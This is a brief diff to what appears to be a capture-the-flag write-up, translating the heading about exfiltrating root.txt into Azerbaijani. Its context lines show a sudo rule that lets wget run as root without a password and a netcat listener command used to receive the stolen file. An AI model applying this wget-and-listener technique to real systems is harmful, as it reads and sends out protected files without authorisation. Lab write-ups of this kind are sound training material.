@@ -163,7 +163,7 @@ sudo -l
 #     (root) NOPASSWD: /usr/bin/wget
 ```
 
-### root.txt Exfil
+### root.txt Eksfiltrasiyası
 
 ```bash
 nc -lvnp 8000
